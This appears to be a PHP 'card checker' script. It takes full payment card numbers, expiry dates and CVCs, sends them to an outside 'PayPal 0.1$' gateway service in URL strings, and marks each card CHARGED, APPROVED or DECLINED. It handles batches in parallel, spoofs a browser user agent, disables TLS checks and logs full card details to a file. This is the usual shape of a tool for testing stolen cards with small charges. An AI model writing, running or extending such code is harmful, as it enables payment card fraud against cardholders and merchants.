<?php

require_once __DIR__ . '/validkey.php';
validateApiKey();


header('Content-Type: text/plain');

// Enable error reporting for debugging (disable in production)
ini_set('display_errors', 0);
error_reporting(E_ALL);

// Optional file-based logging for debugging (disable in production)
 $log_file = __DIR__ . '/paypal0.1$_debug.log';
function log_message($message) {
    global $log_file;
    file_put_contents($log_file, date('Y-m-d H:i:s') . " - $message\n", FILE_APPEND);
}

// Function to check a single card via PayPal 0.1$ API with parallel processing support
function checkCard($card_number, $exp_month, $exp_year, $cvc, $retry = 1) {
    $card_details = "$card_number|$exp_month|$exp_year|$cvc";
    $encoded_cc = urlencode($card_details);
    $api_url = "https://rocks-y.onrender.com/gateway=paypal0.1$/cc=?cc=$encoded_cc";
    log_message("Checking card: $card_details, URL: $api_url");

    for ($attempt = 0; $attempt <= $retry; $attempt++) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $api_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 50); // 50-second timeout
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Insecure; enable in production
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36');

        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curl_error = curl_error($ch);
        $curl_errno = curl_errno($ch);
        curl_close($ch);

        log_message("Attempt " . ($attempt + 1) . " for $card_details: HTTP $http_code, cURL errno $curl_errno, Response: " . substr($response, 0, 200));

        // Handle API errors
        if ($response === false || $http_code !== 200 || !empty($curl_error)) {
            if ($curl_errno == CURLE_OPERATION_TIMEDOUT && $attempt < $retry) {
                log_message("Timeout for $card_details, retrying...");
                usleep(500000); // 0.5s delay before retry
                continue;
            }
            log_message("Failed for $card_details: $curl_error (HTTP $http_code, cURL errno $curl_errno)");
            return "DECLINED [API request failed: $curl_error (HTTP $http_code, cURL errno $curl_errno)] $card_details";
        }

        // Parse JSON response
        $result = json_decode($response, true);
        if (json_last_error() !== JSON_ERROR_NONE || !isset($result['status'])) {
            log_message("Invalid JSON for $card_details: " . substr($response, 0, 200));
            return "DECLINED [Invalid API response: " . substr($response, 0, 200) . "] $card_details";
        }

        $status = $result['status'];
        $message = $result['response'] ?? 'Unknown error';

        // Map API response to status
        $final_status = 'DECLINED';
        if ($status === 'charged') {
            $final_status = 'CHARGED';
        } elseif ($status === 'approved') {
            $final_status = 'APPROVED';
        } elseif ($status === 'declined') {
            $final_status = 'DECLINED';
        }

        $response_msg = htmlspecialchars($message, ENT_QUOTES, 'UTF-8');
        log_message("$final_status for $card_details: $response_msg");
        return "$final_status [$response_msg] $card_details";
    }

    log_message("Failed after retries for $card_details");
    return "DECLINED [API request failed after retries] $card_details";
}

// Function to check multiple cards in parallel using multi-curl
function checkCardsParallel($cards, $max_concurrent = 3) {
    if (empty($cards) || !is_array($cards)) {
        return "DECLINED [No cards provided for parallel check]";
    }

    $mh = curl_multi_init();
    $chs = [];
    $results = [];
    $processed = 0;

    // Initialize curl handles for up to $max_concurrent cards
    foreach ($cards as $index => $card) {
        if ($processed >= $max_concurrent) {
            break;
        }

        $card_number = preg_replace('/[^0-9]/', '', $card['number'] ?? '');
        $exp_month_raw = preg_replace('/[^0-9]/', '', $card['exp_month'] ?? '');
        $exp_year_raw = preg_replace('/[^0-9]/', '', $card['exp_year'] ?? '');
        $cvc = preg_replace('/[^0-9]/', '', $card['cvc'] ?? '');

        // Normalize exp_month
        $exp_month = str_pad($exp_month_raw, 2, '0', STR_PAD_LEFT);

        // Normalize exp_year to 4 digits (supports both YY and YYYY)
        if (strlen($exp_year_raw) == 2) {
            $current_year = (int) date('y');
            $current_century = (int) (date('Y') - $current_year);
            $card_year = (int) $exp_year_raw;
            $exp_year = ($card_year >= $current_year ? $current_century : $current_century + 100) + $card_year;
        } elseif (strlen($exp_year_raw) == 4) {
            $exp_year = (int) $exp_year_raw;
        } else {
            $exp_year = (int) date('Y') + 1; // Default fallback
        }

        $card_details = "$card_number|$exp_month|$exp_year|$cvc";
        $encoded_cc = urlencode($card_details);
        $api_url = "https://rocks-y.onrender.com/gateway=paypal0.1$/cc=?cc=$encoded_cc";

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $api_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 50);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36');

        $chs[$index] = $ch;
        curl_multi_add_handle($mh, $ch);
        log_message("Added parallel check for card $index: $card_details");

        $processed++;
    }

    // Execute multi-curl
    $running = null;
    do {
        curl_multi_exec($mh, $running);
        curl_multi_select($mh);
    } while ($running > 0);

    // Process results
    foreach ($chs as $index => $ch) {
        $response = curl_multi_getcontent($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curl_error = curl_error($ch);
        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);

        if ($response === false || $http_code !== 200 || !empty($curl_error)) {
            $results[$index] = "DECLINED [Parallel API request failed: $curl_error (HTTP $http_code)]";
            log_message("Parallel check failed for card $index: $curl_error (HTTP $http_code)");
            continue;
        }

        // Parse JSON response
        $result = json_decode($response, true);
        if (json_last_error() !== JSON_ERROR_NONE || !isset($result['status'])) {
            $results[$index] = "DECLINED [Invalid parallel API response: " . substr($response, 0, 200) . "]";
            log_message("Invalid JSON in parallel check for card $index: " . substr($response, 0, 200));
            continue;
        }

        $status = $result['status'];
        $message = $result['response'] ?? 'Unknown error';

        $final_status = 'DECLINED';
        if ($status === 'charged') {
            $final_status = 'CHARGED';
        } elseif ($status === 'approved') {
            $final_status = 'APPROVED';
        }

        $results[$index] = "$final_status [$message]";
        log_message("Parallel result for card $index: $final_status [$message]");
    }

    curl_multi_close($mh);

    // Return combined results
    return implode("\n", $results);
}

// Check if the request is POST and contains card data
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['card'])) {
    log_message("Invalid request or missing card data");
    echo "DECLINED [Invalid request or missing card data]";
    exit;
}

// Handle single card or multiple cards
if (is_array($_POST['card']) && isset($_POST['card']['number'])) {
    // Single card
    $card = $_POST['card'];
    $required_fields = ['number', 'exp_month', 'exp_year', 'cvc'];

    // Validate card data
    foreach ($required_fields as $field) {
        if (empty($card[$field])) {
            log_message("Missing $field");
            echo "DECLINED [Missing $field]";
            exit;
        }
    }

    // Sanitize inputs
    $card_number = preg_replace('/[^0-9]/', '', $card['number']);
    $exp_month_raw = preg_replace('/[^0-9]/', '', $card['exp_month']);
    $exp_year_raw = preg_replace('/[^0-9]/', '', $card['exp_year']);
    $cvc = preg_replace('/[^0-9]/', '', $card['cvc']);

    // Normalize exp_month to 2 digits
    $exp_month = str_pad($exp_month_raw, 2, '0', STR_PAD_LEFT);
    if (!preg_match('/^(0[1-9]|1[0-2])$/', $exp_month)) {
        log_message("Invalid exp_month format: $exp_month_raw");
        echo "DECLINED [Invalid exp_month format]";
        exit;
    }

    // Normalize exp_year to 4 digits (full support for YY or YYYY)
    if (strlen($exp_year_raw) == 2) {
        $current_year = (int) date('y');
        $current_century = (int) (date('Y') - $current_year);
        $card_year = (int) $exp_year_raw;
        $exp_year = ($card_year >= $current_year ? $current_century : $current_century + 100) + $card_year;
    } elseif (strlen($exp_year_raw) == 4) {
        $exp_year = (int) $exp_year_raw;
    } else {
        log_message("Invalid exp_year format: $exp_year_raw");
        echo "DECLINED [Invalid exp_year format - must be YY or YYYY]";
        exit;
    }

    // Validate card number, year, and CVC
    if (!preg_match('/^\d{13,19}$/', $card_number)) {
        log_message("Invalid card number format: $card_number");
        echo "DECLINED [Invalid card number format]";
        exit;
    }
    if (!preg_match('/^\d{4}$/', (string) $exp_year) || $exp_year > (int) date('Y') + 10) {
        log_message("Invalid exp_year after normalization: $exp_year");
        echo "DECLINED [Invalid exp_year format or too far in future]";
        exit;
    }
    if (!preg_match('/^\d{3,4}$/', $cvc)) {
        log_message("Invalid CVC format: $cvc");
        echo "DECLINED [Invalid CVC format]";
        exit;
    }

    // Validate logical expiry
    $expiry_timestamp = strtotime("$exp_year-$exp_month-01");
    $current_timestamp = strtotime('first day of this month');
    if ($expiry_timestamp === false || $expiry_timestamp < $current_timestamp) {
        log_message("Card expired: $card_number|$exp_month|$exp_year|$cvc");
        echo "DECLINED [Card expired] $card_number|$exp_month|$exp_year|$cvc";
        exit;
    }

    // Check single card
    echo checkCard($card_number, $exp_month, $exp_year, $cvc);
} elseif (is_array($_POST['card']) && count($_POST['card']) > 1) {
    // Multiple cards - process in parallel (3 at a time)
    echo checkCardsParallel($_POST['card'], 3);
} else {
    log_message("Invalid card data format");
    echo "DECLINED [Invalid card data format]";
}
?>
